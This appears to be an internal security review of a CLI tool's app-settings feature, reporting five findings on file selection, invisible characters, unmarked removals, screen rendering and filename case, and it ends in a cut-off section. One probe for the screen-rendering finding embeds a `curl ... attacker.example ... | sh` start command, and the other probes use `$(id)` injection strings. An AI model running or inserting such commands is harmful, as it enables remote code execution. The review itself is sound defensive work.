# Security Review: App Settings

Everything in [`specs/006-cli-small-features/security-review.md`](../006-cli-small-features/security-review.md),
[`specs/004-cli-app/security-review.md`](../004-cli-app/security-review.md) and
[`specs/003-cli-runner/security-review.md`](../003-cli-runner/security-review.md) still applies, except
where part 5 below says otherwise.

This is not an external audit. One independent reviewer (a separate agent that did not write the
code) read the source and ran its own probes. Nothing was fixed as part of this review. An external
audit is still required before production use.

## 1. Scope and method

**Commit.** `72041c1` on `010-app-settings`, the head when the review started: the 16 commits of
`git log dev..HEAD`. In `apps/cli/src` that is 50 files, 6,352 lines added and 99 removed.
`apps/cli/src/app/effects/deploys.ts` was changed by another builder during the review. It was read
again at `0f9a99b` ("the app's d deploys the file zekno deploy would"), the last commit that touched
it when this review ended. The working tree then held another builder's uncommitted changes to
`README.md`, `apps/cli/README.md`, `apps/cli/test/docs/docs.test.ts`, `apps/web/content/docs/cli.mdx`
and `specs/010-app-settings/tasks.md`; they were not reviewed.
`git diff dev HEAD -- packages apps/runner` is empty: the core library and the runner are unchanged
(FR-029, SC-007).

**Attackers considered**, as in the earlier reviews:

| Attacker | Can do |
|----------|--------|
| A project folder's author | Own the files of a cloned repository, or of a branch of the team's own repository: `zekno.app.json`, `compose.yaml`, folder names, links. Holds no team key. |
| Attacker B | Change files in the profile folder (`~/.zekno`). Cannot read the keychain. |
| A runner or server that lies | Answer anything. Holds no team key. |
| The hosted service to come | Nothing in this feature reaches it: settings are read, checked and turned into Compose text on the developer's machine only. |
| Typed-ahead keys | Keys pressed before a question is on the screen. A condition, not an attacker. |

**Read in full**: `settings/` (`json.ts`, `shape.ts`, `schema.ts`, `values.ts`, `words.ts`,
`file.ts`, `write.ts`, `text.ts`, `change.ts`, `source.ts`, `rows.ts`, `piped.ts`, `compose.ts`,
`types.ts`), `ops/settings.ts`, `commands/settings.ts`, `app/state/settings.ts`,
`app/state/settings-change.ts`, `app/effects/settings.ts`, `app/screens/settings.tsx`,
`settings-rows.tsx`, `settings-change.tsx`, `settings-layout.ts`, `ui/ink/settings-report.tsx`, and
`app/effects/deploys.ts` at `0f9a99b`.

**Read as diffs, with the code around them**: `project/compose-read.ts`, `project/shown.ts`,
`ops/deploy.ts`, `commands/deploy.ts`, `ops/link.ts`, `asking/asking.ts`, `asking/first-deploy.ts`,
`cli/cli.ts`, `cli/errors.ts`, `ui/plain/plain.ts`, `ui/ink/ink.tsx`, `ui/ink/lines.tsx`,
`ui/ink/deploy-live.ts`, `ui/parts/deploy-summary.tsx`, `shared/views.ts`, `shared/deploy.ts`,
`app/state/state.ts`, `app/state/reading.ts`, `app/effects/effects.ts`.

**Read because the new code leans on it**: `server/sanitize.ts`; `project/file.ts` (`findProject`,
`isHere`, `listedExactly`); `ui/parts/text-input.tsx`, `ui/parts/confirm.tsx`,
`ui/ink/questions.tsx` (`listWindow`); `app/effects/context.ts` (`trustKnown`); the runner's
`docker/compose.ts` (the environment Docker Compose interpolates from); the core's
`secrets/secrets.ts` (`SECRET_NAME`, `APP_NAME`, `isReservedSecretName`).

**Specs read**: `spec.md`; `contracts/settings-file.md`, `compose-text.md`, `deploy.md`, the
`zekno settings` part of `commands.md`; `research.md` R4 and R6; the three earlier reviews.

**Run**:

- The feature's tests. `test/settings/` (14 files) with `test/plain/plain-unchanged.test.ts`: 494
  pass. `test/ops/settings.test.ts`, `test/commands/settings.test.tsx`,
  `test/app/settings-effects.test.ts`, `settings-state.test.ts`, `settings-screen.test.tsx`,
  `test/scenarios/settings-compose.test.ts`, `settings-deploy.test.ts`,
  `test/ui/ink/settings-report.test.tsx`, `test/shared/views.test.ts`: 159 pass.
  `test/app/app-effects.test.ts` and `test/asking/first-deploy.test.ts` at `0f9a99b`: 57 pass.
- Seven throwaway probes in a scratch folder outside the repository, importing the repository's
  modules and test helpers:
  1. the Compose text of 15 hostile settings files, each run through
     `docker compose -p zekno-probe -f compose.yaml config` (Docker Compose v5.3.0 on this Mac;
     `config` only, with a minimal environment that sets `HOME` and `X`), against a control file
     that asks for `${X}`;
  2. three linked folders, with the in-memory key store, a local runner and the stand-in Docker:
     `zekno settings`, `zekno settings compose`, then `zekno deploy`, and the text signed read from
     the history (S1);
  3. the marks after a plain variable, a volume and a service were removed (S3);
  4. invisible characters in a plain value and a start command, through every surface (S2);
  5. name variants of the two files on this Mac's case-insensitive disk: letter case, a Cyrillic
     look-alike, a link to nowhere, a folder, a link out of the folder (S5);
  6. the cost of hostile files on the reader, and of the largest good files on the screen's
     layout functions;
  7. which lines of a long value the settings screen can draw (S4).
- Not used: the system keychain, `ssh`, the network, a real terminal or pseudo-terminal,
  `docker compose up` or anything that pulls or starts.

## 2. Findings

| Id | Severity | Finding | Confirmed |
|----|----------|---------|-----------|
| S1 | Medium | `zekno settings` and `zekno settings compose` show another file than `zekno deploy` deploys in the same folder, when a `zekno.json` decides | Yes, by a probe |
| S2 | Low | Invisible characters in a plain value or a start command are removed from everything shown and kept in what is signed | Yes, by a probe |
| S3 | Low | A plain variable, a volume or a service removed since the last deploy is never marked | Yes, by a probe |
| S4 | Informational | On the settings screen the middle of a long value is never drawn | Yes, with the screen's layout functions |
| S5 | Informational | The settings file is found in any letter case on a case-insensitive disk, unlike `zekno.json` | Yes, by a probe |

No finding is rated high or critical. No way was found to make the Compose text mean more than the
settings show (part 3, "The Compose text").

### S1. The settings commands show another file than the deploy uses (Medium)

**Why medium**: the command made so that a person knows "exactly what will run" prints, with status
0 and no warning, a text that `zekno deploy` in the same folder does not sign, in ordinary linked
folders; a reviewer who trusts it deploys a file they did not read, with the app's secrets.

**Where**: `apps/cli/src/ops/settings.ts:103-104` (`readHere`) always reads `<cwd>/zekno.app.json`.
It is used by `showSettings` (`:130-156`), `settingsData` (`:164-168`), `prepareSettingChange`
(`:211`) and `folderCompose` (`:273-276`). `linkInUse` (`:73-88`) looks only at a `zekno.json` in
this very folder (`isHere`, `:83`); `folderCompose` looks at none. `zekno deploy` takes the file
from the `zekno.json` that applies here or in a folder above (`cli/cli.ts:225-232`, `withProject`),
then `chooseSource` (`settings/source.ts:53-74`), where the link's file (rule 2) comes before the
file in the folder (rule 3): `ops/deploy.ts:185-190`, and `asking/first-deploy.ts` at a terminal.

**Who**: whoever can change the files of a folder that a team-signed `zekno.json` already links,
such as the author of a pull request on the team's repository (the attacker of K3 in feature 004).
No key is needed. It also happens by accident in a repository with several apps.

**Steps and result** (probe, plain output, a team-signed `zekno.json` in use here):

- **A.** `zekno.json` at the root names the root's `zekno.app.json` (image `ghcr.io/acme/root:1`).
  A sub-folder `sub` holds its own `zekno.app.json` (image `ghcr.io/acme/sub:1`). In `sub`,
  `zekno settings` prints `web	source.image	ghcr.io/acme/sub:1` and `zekno settings compose`
  prints the sub-folder's text, both with status 0 and nothing on standard error. `zekno deploy`
  there prints `Deploy 1 of demo is running on dev with no secrets.`; the history holds the signed
  text of `ghcr.io/acme/root:1`.
- **B.** `zekno.json` in the folder names `compose.yaml`, as every folder linked before this feature
  does, and a `zekno.app.json` is added. `zekno settings compose` prints the settings' text, status
  0, nothing on standard error. `zekno deploy` signs `compose.yaml`. Here `zekno settings` does say
  SH3 ("This folder's zekno.json names compose.yaml, so zekno deploy uses it, not these settings.").
- **C.** `zekno.json` names `deploy/zekno.app.json`, and the folder has its own `zekno.app.json`.
  `zekno settings` and `zekno settings compose` show the folder's own (`ghcr.io/acme/visible:1`),
  with no note. `zekno deploy` signs `deploy/zekno.app.json` (`ghcr.io/acme/hidden:1`).

In plain output the deploy names no file. At a terminal, a deploy from settings names its file in
the summary's `from` row (A and C, as `~/...` or `deploy/zekno.app.json`). A deploy from a Compose
file has no `from` row (`ui/parts/deploy-summary.tsx:86-105`), so in B nothing names
`compose.yaml`. In all three cases `zekno settings set` and `unset` write the folder's own file and
end with "Written. Run zekno deploy to use it." (`commands/settings.ts:73`, CS11), which the next
deploy does not use. FR-018 ("for an app described by a Compose file, each surface MUST say so")
does not hold for `zekno settings compose` in B.

The full-screen app is not affected: its settings screen and its `d` both take the file from the
link (`app/effects/settings.ts:100-124`; `app/effects/deploys.ts:153-224` at `0f9a99b`).

**Smallest fix**: decide the file of every `zekno settings` command by the deploy's rule. No
keychain is needed for that: `findProject(cwd)` gives the `zekno.json` that applies. When one applies
(here or above) and the file it names is not `<cwd>/zekno.app.json`, `settings compose`, `set` and
`unset` stop with a sentence that names the file `zekno deploy` would use, and `zekno settings` says
so as SH3 does. Whether that `zekno.json` is signed does not matter here: signed and in use, the
deploy uses the other file; not, the deploy stops or asks.

### S2. Invisible characters are removed from what is shown and kept in what is signed (Low)

**Why low**: a value reads as `true` or `production` everywhere zekno shows it and is another value
in the container; it needs an app that compares such a value exactly, and a code host's diff view
may flag the character.

**Where**: `settings/values.ts:67` (`NOT_ALLOWED`) refuses only `Cc`, U+2028, U+2029, U+FEFF,
U+FFFE and U+FFFF (`holdsOnlyAllowed`, `:73-75`). `server/sanitize.ts:23` and `:31` remove every
`\p{Cf}`, `\p{Zl}`, `\p{Zp}` and `Default_Ignorable_Code_Point` character when text is drawn. Only
two settings can hold such a character: the start command (`values.ts:128-179` takes any character
but its own few) and a plain value (`values.ts:269-273`). Every other setting is held to an ASCII
pattern.

**Who**: the author of a settings file, or of a change to one.

**Steps** (probe): plain `NODE_ENV` = `production` U+200B, `REQUIRE_AUTH` = `true` U+E0001 (a tag
character), `ALLOWED_HOST` = `app.` U+00AD `example.com`, `HANGUL` = `on` U+3164; start
`bun run start` U+2060.

**Result**: piped `zekno settings`, the report at a terminal (`settings/rows.ts`), the screen's rows
and its Compose text (`app/screens/settings-layout.ts:204-217`), `zekno settings compose` at a
terminal (`commands/settings.ts:146`) and the change box all show `NODE_ENV=production`,
`REQUIRE_AUTH=true`, `ALLOWED_HOST=app.example.com`, `HANGUL=on` and `bun run start`. The Compose
text that is signed keeps every character, and `docker compose config` keeps them in the
environment and in the command. A change that only adds U+200B is marked
`NODE_ENV=production  ! changed, not deployed (was NODE_ENV=production)`. Only `--json` and
`zekno settings compose` piped show the bytes.

**What an attacker gains today** (the foundation builder's question): a value that reads as the
expected one and is not. An exact comparison in the app then fails: a `NODE_ENV` that is not
`production`, a security flag read as off, a host allowlist that no longer matches. In a start
command a hidden character mostly makes a word fail. Look-alike letters (U+0578 for `u`) are drawn
as they are; no rule of the reader can tell them, and this finding does not cover them.

**Smallest fix**: yes, the reader should refuse them. Add to `NOT_ALLOWED` every character
`sanitize` removes: `\p{Cf}`, `\p{Zl}`, `\p{Zp}`, and `\p{Default_Ignorable_Code_Point}` but U+FE0E
and U+FE0F. Then, for every value the reader takes, what is drawn is what is signed, and
`zekno settings set` and the screen refuse them too, since they use the same checks. If a script
needs one (U+200C in Persian text), draw it as a visible escape instead of removing it.

### S3. A setting or a service removed since the last deploy is never marked (Low)

**Why low**: the marks exist to say what the next deploy changes, and they say nothing of a
removal, which can be a security setting; the contract states this choice.

**Where**: `settings/rows.ts:139-160` and `:163-181` make a row only for each plain variable and
volume the file has now, and `:230-244` and `:251-295` only for each service it has now. `markOf`
(`:45-62`) compares a row with the deployed value of the same name. The screen's `none` row
(`:257-272`) is marked only when no variable, or no volume, is left. contracts/commands.md: "A
setting the last deploy had and the file no longer has is not shown."

**Who**: the author of a change (a pull request), against a developer who reads the marks before
deploying.

**Steps** (probe): the last deploy had `web` with `NODE_ENV` and `REQUIRE_AUTH=1`, volumes `data`
and `audit`, and a second service `auth`. The file now has `web` with `NODE_ENV` and `data` only.

**Result**: no row of `zekno settings` or of the screen is marked, though the Compose text differs.
The next deploy drops `REQUIRE_AUTH` and the `audit` mount, and stops `auth`
(`--remove-orphans`).

**Smallest fix**: after a service's rows, one marked row for each plain variable or volume the
deployed service had and the file has not (`! removed, not deployed (was <value>)`), and one line
for each deployed service the file no longer has.

### S4. On the settings screen the middle of a long value is never drawn (Informational)

**Why informational**: the whole value is in `zekno settings`, and in the screen's Compose text
(`c`), which scrolls line by line.

**Where**: `app/screens/settings-rows.tsx:105-111` keeps the selected row's first line in the
middle of the pane (`listWindow`, `ui/ink/questions.tsx:64-81`), and `↑↓` move by row, never by
line. The change box keeps 3 lines of the old and the new value and ends them with "…"
(`settings-change.tsx:58-66`, `settings-layout.ts:28`).

**Who**: the author of a settings file, against a person who reads the settings on the screen.

**Steps** (probe with the layout functions the screen draws with, not drawn by Ink): a start
command `sh -c 'echo starting <1,500 characters>; curl -s https://attacker.example/x | sh ;<1,500
characters> && exec bun run start'`.

**Result**: at 80 by 24 the value takes 83 lines of the service pane, and 72 of them, the one with
`attacker` among them, are drawn for no row selected. At 120 by 40, 2 of 40; at 200 by 60, none.

**Smallest fix**: let `↑↓` scroll through a row taller than the pane before moving to the next row,
or draw such a row cut, with a line that points to `c`.

### S5. The settings file is found in any letter case (Informational)

**Why informational**: on one machine the file shown and the file deployed are the same file; only
two machines can differ.

**Where**: `settings/source.ts:42-50` (`present`, `lstat`) and `project/compose-read.ts:136`
(`realpathSync`) find `ZEKNO.APP.JSON` under the name `zekno.app.json` on a case-insensitive disk,
as macOS has by default. Feature 004 closed the same for `zekno.json` ("the file-name case note",
`listedExactly` in `project/file.ts:325`).

**Steps** (probe on this Mac): a folder with only `ZEKNO.APP.JSON`.

**Result**: the deploy's choice is `settings`, the file is read and turned into Compose text, and
`zekno settings` and every sentence call it `zekno.app.json`. On Linux the same folder has no
settings file. A folder with `Zekno.App.Json` and `compose.yaml` is "both" here, and asks. A
look-alike name (`zekno.аpp.json` with a Cyrillic `а`) counts nowhere, which is right.

**Smallest fix**: count a settings file only when its folder lists it exactly as `zekno.app.json`,
in `present` and before reading, as `findProject` does for `zekno.json`.

### Needs validation

- **The screen's Compose text against what `d` signs.** The screen shows the text of its last read,
  made again every 5 seconds (`app/effects/settings.ts:166-207`, `app/state/settings.ts:214-222`).
  `d` on the screen (`app/state/settings.ts:66-69`, `:156`) starts the app's deploy, which reads the
  file again (`app/effects/deploys.ts:153-224`) and signs that. A file changed in between (a
  `git checkout` in another terminal, an editor) is signed without being shown, and nothing
  compares the two. Read in the code, not run. Missing: a run in the app with the file changed
  after a read and before `d`. If it holds, the fix is to carry the screen's SHA-256 with `d` and
  refuse a file read at `d` with other bytes.
- **`zekno settings init` on a file system without hard links.** When `link` fails with `EPERM`,
  `ENOTSUP`, `EOPNOTSUPP`, `EMLINK` or `ENOSYS`, `createSettings` checks that nothing is there, then
  renames (`settings/write.ts:247-256`). A file made between the two is replaced, against "never
  over a file that is there, not even one made in between". Read in the code, not run. Missing: a
  run on exFAT or a network share, or a test whose `link` fails with `ENOTSUP`.
- **Two names that differ only in case in one Git repository** (S5). Git keeps `zekno.app.json`
  and `ZEKNO.APP.JSON` side by side; which one a macOS checkout keeps was not run.
- **`docker compose up` on a Linux server.** Only `docker compose config` was run, on macOS. Both
  use the same loader; whether `up` reads the hostile texts of part 3 the same way was not seen.
- **Combining marks.** The reader and `sanitize` both keep them (30 × U+0301 after `ok` passes;
  N3 of feature 004). Whether they draw over the rows above and below on the settings screen in
  common terminals was not looked at.

## 3. Properties checked and found to hold

**The Compose text** (`settings/compose.ts`). Probe 1 ran each of these through
`docker compose config` (v5.3.0) with `HOME` and `X` set: a plain value
`${HOME} $HOME $$ $${X} ${X:-$(id)}`; a value ending in `\`; `\"`; YAML escapes `\x41A\N\_\0`;
`a: b # c [d] {e} &f *g !h --- ...`; services named `true`, `null`, `y`, `on`, `x-evil`; a volume
named `x-data`; mount paths `/var/run/docker.sock`, `/proc/x`, `/a@b+c.-_`; a start command with
`\"`, `\\`, `$(id)` and `${HOME}` in double quotes; NBSP and U+2800 in a start command; U+FDD0 and
U+10FFFF in a value. The control file's `${X}` became `interpolated`; no settings value was
interpolated, every name and value came back as written, and nothing but `image`, `command`,
`environment`, `volumes` (long form, `type: volume`) and the project's default network appeared.

| Property | Enforced at | Test |
|----------|-------------|------|
| Every name and string value is a YAML double-quoted scalar, `\` then `"` escaped, every `$` written `$$`; no value can end its scalar, start a key, comment, tag, anchor, alias, merge key, document or interpolation | `compose.ts:36-42`, used at `:46-83`, `:99` | `test/settings/compose.test.ts`; `compose-random.test.ts` (a thousand seeded settings; `docker compose config` on the good files where Docker is installed) |
| No character a setting may hold needs another escape or breaks a line for go-yaml: `Cc` (NEL, C1 and DEL among them), U+2028, U+2029, U+FEFF, U+FFFE, U+FFFF and lone surrogates are refused | `values.ts:67-75`, applied to every string (`isImage` `:90`, `splitStart` `:131`, `checkPlainValue` `:270`) | `values.test.ts` (U+0085, U+2028 among the refused); `schema-hostile.test.ts`, "a lone surrogate, a control character or U+2028 in a name ..." |
| The text has only the keys zekno writes: no `privileged`, device, capability, `network_mode`, `pid`, `env_file`, `extends`, `include`, bind mount or relative path | `compose.ts:45-102`: fixed keys only; names held to `SERVICE_NAME` and `VOLUME_NAME` (`values.ts:39-41`) | `compose.test.ts` (each setting alone, the worked example byte for byte) |
| A volume is always a named volume, mounted at an absolute container path with no `.` or `..` part | `compose.ts:76-84`, `:97-100`; `values.ts:49`, `:283-292` | `compose.test.ts`; `values.test.ts` |
| The only interpolation is a secret, `"${NAME}"`, its name held to `SECRET_NAME`, at most 128 characters, not reserved; the runner gives Compose only the app's secrets and six names that are all reserved | `compose.ts:70-71`; `shape.ts:127-149`; `values.ts:246-252`; runner `docker/compose.ts:4-24`, `:84-90` | `schema.test.ts` (SV18, SV19); `scenarios/settings-deploy.test.ts` (both secrets reach Docker's environment, the text holds neither value) |
| A plain value cannot shadow a secret of its service | `schema.ts:282-284` (SV25) | `schema.test.ts` |
| A volume of another app cannot be named: `zekno-<app>_<volume>`, and app names hold no `_` | core `APP_NAME` (`secrets.ts:20`); `VOLUME_NAME` | No test covers this |
| The same settings give the same bytes; the deploy signs `composeText` of the file read once | `compose.ts:89-102`; `source.ts:82-93`; `ops/deploy.ts:184-203` | `compose-random.test.ts`; `scenarios/settings-compose.test.ts` and `settings-deploy.test.ts` (printed, signed and started text equal, byte for byte, in a folder with only the settings file) |
| A `zekno.json` naming `zekno.app.json`, read by a zekno before this feature as a Compose file, is refused by Docker Compose rather than run | Compose's own schema: `services.web.deploy additional properties 'cpus', 'memory', 'restart', 'start' not allowed` (probe, v5.3.0) | No test covers this |

**The reader** (`settings/file.ts`, `json.ts`, `schema.ts`, `shape.ts`):

| Property | Enforced at | Test |
|----------|-------------|------|
| One open file, `O_RDONLY | O_NOFOLLOW | O_NONBLOCK`, inside its folder by real path before and after, a regular file of this user's with one name, at most 64 KiB by `fstat` and while reading | `project/compose-read.ts:121-202`; `file.ts:117-147` | `file.test.ts`, "SR1 to SR9" (a pipe at once, a sparse file, a hard link, a link out) |
| Strict UTF-8; one byte order mark dropped, a second one refused | `file.ts:149-156`; `schema.ts:298` | `file.test.ts`, "one byte order mark is dropped; a second is not JSON"; `schema-hostile.test.ts` |
| JSON only: depth 6 checked as each object or list opens, strings of at most 4,096 code points counted while read, keys compared after escapes, objects as `Map`s, every exception a fault | `json.ts:184`, `:224`, `:122-129`, `:197-201`, `:186`, `:263-275` | `json.test.ts`, "SJ2 ... compared after escapes", "SJ3: very deep nesting stops at once"; `schema-hostile.test.ts`, "every exception is a fault, never thrown" |
| No key reaches a prototype; `__proto__`, `constructor` and `toString` are unknown keys or plain names | `shape.ts:231-232` (`Object.hasOwn`); `schema.ts:84-104` (`Map`s for named objects, `Object.fromEntries` elsewhere), `:107-146` | `json.test.ts`, "keys a prototype has ..."; `schema-hostile.test.ts`, "names a prototype has ... stay names" |
| Later settings are refused by their presence, in their own section only | `shape.ts:84-85`, `:214-228`; `schema.ts:131-135`; version `:316-322` | `schema.test.ts` (SL0 to SL5) |
| A fault names a place and a fixed rule; a name is put in only after it passed its rule | `schema.ts:152-237`; `words.ts` | `schema-hostile.test.ts`, "a value never comes back into a sentence ..."; the sentinel in every faulty file (`test/support/settings-files.ts`) across `settings-deploy.test.ts` and `commands/settings.test.tsx` |
| A hostile file costs little: measured here, the worst built (16,000 bad secret names, every value of every service wrong, 60 KiB numbers, quote and image patterns made to backtrack) took at most 30 ms | the bounds above; anchored patterns with no nested repeats (`values.ts:39-58`) | `json.test.ts`, "a file of 64 KiB of keys ... reads quickly" |

**Which file a deploy uses** (`settings/source.ts`):

| Property | Enforced at | Test |
|----------|-------------|------|
| `-f`, then the link's file, then the one file here; both here and nothing above: a question at a terminal, DP2 and status 2 without one; never a silent pick | `source.ts:53-74`; `ops/deploy.ts:185-190`; `asking/first-deploy.ts` (`whichFile`) | `source.test.ts`, "chooseSource: the first rule that applies decides"; `settings-deploy.test.ts` |
| A name is there without following a link: a link to nowhere, a link out and a folder of that name all count, so neither file can vanish and let the other win | `source.ts:42-50` | `source.test.ts`, "a link is not followed to decide whether a file is there ..."; probe 5 |
| The app's `d` follows the same rule; with both and no link it deploys nothing (DP5) | `app/effects/deploys.ts:153-224` at `0f9a99b` | `app-effects.test.ts` at `0f9a99b` |
| `zekno link` names `zekno.app.json` only when it is the one file here; with both, DP2 before any question | `ops/link.ts` (`fileHere`); `cli/cli.ts` (`linkDetails`) | `settings-deploy.test.ts` |
| The rules of a `zekno.json` not signed by the team, or not yet used here, are unchanged (FR-013) | `withProject` unchanged; `chooseSource` takes the link only when given one | the feature 004 tests, unchanged and passing in `first-deploy.test.ts` |

**The writer** (`settings/write.ts`):

| Property | Enforced at | Test |
|----------|-------------|------|
| A change is written whole or not at all: a new file beside it under a random name (`wx`, 0600), the old mode set with `fchmod`, written, flushed, renamed over; the temporary file removed on failure | `write.ts:106-124`, `:187-208` | `write.test.ts`, "replaces the file ... and keeps its mode", "the file is flushed ...", "a failure after the new file was made leaves no temporary file" |
| Never over a file that changed, a link, another file, a second name or another user's file: `lstat`, then a reopen with `O_NOFOLLOW`, device, inode and SHA-256 compared, right before the rename | `write.ts:133-179` | `write.test.ts`, the CS12, CS13 and hard-link tests |
| The text written reads back to the same settings | `write.ts:85-95`; `change.ts:295-307` | `write.test.ts`, "a text the reader does not read back stops before anything is written" |
| `zekno.app.json` that is a link is never written through, even to a file inside the folder | `ops/settings.ts:178-186`, `:222`, `:232`; `app/effects/settings.ts:237-238` | `commands/settings.test.tsx`, "CS13 ..."; `settings-effects.test.ts`, "a file now a symbolic link is not written through" |
| `init` never replaces a file, a link or one made since the check (on a disk with hard links) | `ops/settings.ts:241-244`; `write.ts:247-251` | `write.test.ts`, "IN4: nor a link, nor a file that appears between the check and the link" |
| The race between the last check and the rename costs another program's write of those few calls, nothing more: a link put at the name is replaced, not followed; a folder swapped on the way makes the rename fail | `write.ts:197-199` | `write.test.ts`, "a change made between the check and the rename is the known limit" |

**Questions, terminals and secrets**:

| Property | Enforced at | Test |
|----------|-------------|------|
| With no terminal, `set` and `unset` write only with `--yes`, and `init` never | `commands/settings.ts:71`, `:114`; `ui/plain/plain.ts:85-87` | `commands/settings.test.tsx`, "piped: with --yes ...; without, ... nothing written"; "IN4 before any question ...; with no terminal, IN5" |
| At a terminal a key typed before the question never answers it | `Ui.confirm` and `Ui.choose` unchanged (feature 004, K12) | `test/ui/ink/questions.test.tsx` (feature 006) |
| On the screen only `y` writes; `n`, Enter and Esc do not; a paste holding a line break is not taken, so a paste cannot both submit a value and answer | `settings-change.ts:191-207`; `ui/parts/text-input.tsx:44-51` | `settings-state.test.ts`, "asking: y asks to write ...; n, enter and esc write nothing", "a paste of one line is taken, of several not" |
| A write from the screen is refused when the file is not the bytes the change was opened on | `settings-change.ts:97`, `:206`; `app/effects/settings.ts:239-240`; then `write.ts:133-179` | `settings-state.test.ts`, "the SHA-256 written against is the one the change was opened on ..."; `settings-effects.test.ts`, "the file edited elsewhere while a change is being confirmed" |
| Opening the screen, its ticks and a write read no keychain; the history is read with the team list verified at start | `app/effects/settings.ts:128-207` (`trustKnown`, `lastDeployedCompose`); `app/effects/context.ts:130` | `settings-effects.test.ts` (`touched` stays `{ keychain: 0, servers: 0 }`) |
| `set`, `unset`, `init` and `compose` never open the team or connect | `ops/settings.ts:199-276` | `commands/settings.test.tsx`, "in a linked folder with a team, set and unset never read the keychain and never connect" |
| Everything drawn from the file is cleaned or held to an ASCII pattern: rows, marks, the Compose text at a terminal and on the screen, the value filled in a change, file paths, notices | `rows.ts:61`, `:78`; `change.ts:157`; `settings-layout.ts:207`; `settings-change.tsx:126`; `settings-report.tsx`; `piped.ts:51-56`; `commands/settings.ts:146`; `project/shown.ts` | `settings-screen.test.tsx`; `settings-report.test.tsx`; `commands/settings.test.tsx` (S2 is about what cleaning removes, not about escape sequences) |
| No secret value is in the file, a line, a screen, an error or `--json`: the file holds names only, and the history comparison reads Compose text, which holds `${NAME}` | `shape.ts:127-149`; `shared/views.ts:338-346` | `commands/settings.test.tsx`, "no secret value appears in any output ... (SC-004)"; `settings-effects.test.ts`, "no secret value reaches what the screen is given" |
| A reserved secret name is refused in `secrets` (SV19), by the runner's own rule; reserved names stay allowed as plain names, which only reach the container | `values.ts:246-252`; `shape.ts:129-136` | `schema.test.ts`; `values.test.ts` |
| Plain output and `--json` cannot be split into false columns: no value or name holds a tab or a line break | `values.ts:67` | `commands/settings.test.tsx` (piped lines) |
| The screen stays usable with the largest good files: measured here, at most 12 ms per frame for its rows and Compose lines (128 plain values of about 490 characters; a Compose text of 179,232 bytes from 32 services of 256 secrets) | `settings-layout.ts` | No test covers the cost |
| With no terminal, every command that existed before behaves as before in a folder with no settings file | `chooseSource` gives `compose` there; `present` changes nothing when the name is absent | `plain/plain-unchanged.test.ts` (only the help gained five lines) |

**Noted, not a finding.** In a folder that is not linked, the settings screen of whichever app is
selected (`<server> › <app> › settings`) shows this folder's `zekno.app.json`, marked against that
app's last deploy, and `d` then deploys it to that app after "Remember this folder?". That is
research R6 and the rule `d` has had since feature 004 for `compose.yaml`; the screen now adds the
app's name over a file that may never have been that app's.

## 4. Tests that are missing

For properties that hold:

- `docker compose config` with an environment that sets each name a value mentions after `$`, so
  that interpolation would show; and a check that Compose's output has no service key but those
  zekno writes. The existing Docker test compares names and values in its own environment.
- Service and volume names that start with `x-`, through Docker Compose. Version 5.3.0 keeps them
  as a service and a volume; a Compose that read them as extensions would drop a service the
  settings show.
- A volume of one app cannot name another app's volume (`zekno-<app>_<volume>`).
- A settings file read as a Compose file (a `zekno.json` naming `zekno.app.json`, deployed by a zekno
  before this feature) is refused by Docker Compose.
- The cost of the largest good file on the screen's rows and Compose lines, per frame.
- `settings-effects.test.ts`, "both files and no link: the settings, as d would ask before deploying
  them": since `0f9a99b`, `d` does not ask there, it says DP5. The test's name, not its check, is
  out of date.

For the findings, once fixed: the three folders of S1, for `settings`, `settings compose`, `set` and
`unset`; each character class of S2 in a plain value and a start command, refused with SV24 and SV9;
a removed plain variable, volume and service marked (S3); a row taller than the pane, seen whole on
the screen (S4); `ZEKNO.APP.JSON` alone, not a settings file (S5).

## 5. Carried over from earlier reviews

**Feature 003**

- C1, trust rebuilt from the signed lists: still true. `zekno settings` opens the team with
  `teamOf`; the screen uses the team list verified when the app opened.
- C3, a deploy read from under its signature, never from the unsigned history: still true. The
  marks read the last deploy's Compose text through `verifiedDeploys` (`shared/views.ts:338-346`).
  Which deploy counts as the last still rests on the unsigned `outcome` mark; attacker B can change
  the marks, nothing else.
- C4, deploy numbers: unchanged. A deploy from settings goes on from `prepareDeploy` as before.
- C5, the hidden prompt: unchanged.
- C6, names from the runner: unchanged.
- Hardening, words after a command: still true. `settings set` takes at most four words, `unset`
  three, `compose` and `init` two (`cli/cli.ts`, `WORDS`, checked at `:185`).
- Hardening, reserved names: still true. SV19 uses `isReservedSecretName`, the runner's rule.
- "A signed Compose file can read the runner's key through a bind mount or a relative path": a
  Compose text made from settings can do neither. It holds named volumes only, and no path of the
  server.

**Feature 004**

- C8, C9, C10, text cleaned before it is drawn: still true for every new surface. C10 removes
  invisible characters when drawing; S2 is what that leaves for a value that is signed.
- P1, a `zekno.json` not signed by the team is never used: still true. `zekno settings` never uses,
  asks about or records one.
- P2, a `zekno.json` above gives its file only to its own app: still true for the deploy. S1 is the
  settings commands not following it.
- P5, aliases counted before YAML is parsed: still true. `deployedSettings` bounds the text and
  counts aliases first (`compose.ts:184-186`).
- P6 and P7, one reader that keeps a file inside its folder: still true. The settings file is read
  by the same `readInsideBytes`, with a 64 KiB limit.
- The file-name case note (only a file listed exactly as `zekno.json` counts): not applied to
  `zekno.app.json` (S5).
- K1, K2, K4, the questions about a teammate's signed `zekno.json`: unchanged. A link may now name
  `zekno.app.json`; the question shows it as it shows a Compose file.
- K3 and N5, the signature vouches for names, not for the content beside them: unchanged, and true
  of `zekno.app.json`. The tool for reading a branch, `zekno settings compose`, is the one S1 is
  about.
- K8, a link's path stays inside its folder: unchanged.
- K10, one keychain read per command: still true. `zekno settings` reads it once, and only when
  this folder has its own `zekno.json` and a profile exists.
- K12, typed-ahead keys: still true for DP1 and CS9 at a terminal. On the screen only `y` writes.
- L7 and L8, reads in the background: the settings screen's tick asks for the same refresh the app
  screen does, through the kept session. Nothing new connects.
- N1, a token taken as a secret's name: now also reachable as `zekno settings set web.secrets
  sk_live_...`, which fits `SECRET_NAME` and is written into `zekno.app.json`, a file meant to be
  committed. The same holds for a secret value given by mistake as a plain value
  (`web.plain.API_KEY`): it is shown before the question, but nothing says the file is meant for a
  repository, and the value stays in the shell's history. No rule can tell such a value.

**Feature 006**

- With no terminal, every existing command takes its old path: still true
  (`plain-unchanged.test.ts`, help lines only).
- A key typed before a question never answers it: still true for DP1 (`Ui.choose`) and CS9
  (`Ui.confirm`).
- S1 to S4 of that review: not touched by this feature.

**Not checked by this review**: a real terminal or pseudo-terminal; real SSH; `docker compose up`;
Linux; macOS Keychain prompts; the full-screen app drawn by Ink beyond its layout functions and the
existing tests.

## 6. After the review: what was fixed

**Written by the implementer of the fixes, not by the reviewer.** Parts 1 to 5 above are the
